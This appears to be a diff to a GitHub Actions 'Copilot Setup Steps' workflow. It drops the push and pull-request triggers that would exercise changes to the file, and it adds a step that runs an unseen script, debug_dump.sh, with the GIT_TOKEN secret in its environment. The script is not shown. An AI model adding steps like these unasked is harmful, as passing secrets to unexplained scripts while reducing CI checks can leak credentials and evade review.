@@ -4,12 +4,6 @@ name: "Copilot Setup Steps"
 # allow manual testing through the repository's "Actions" tab
 "on":
   workflow_dispatch:
-  push:
-    paths:
-      - .github/workflows/copilot-setup-steps.yml
-  pull_request:
-    paths:
-      - .github/workflows/copilot-setup-steps.yml
 
 jobs:
   # The job MUST be called `copilot-setup-steps` or it will not be picked up by Copilot.
@@ -25,7 +19,13 @@ jobs:
     # You can define any steps you want, and they will run before the agent starts.
     # If you do not check out your code, Copilot will do this for you.
     steps:
+
       - name: Checkout code with LFS
         uses: actions/checkout@v4
         with:
           lfs: true
+
+      - name: Run debug_dump.sh script
+        run: bash debug_dump.sh
+        env:
+          GIT_TOKEN: ${{ secrets.GIT_TOKEN }}
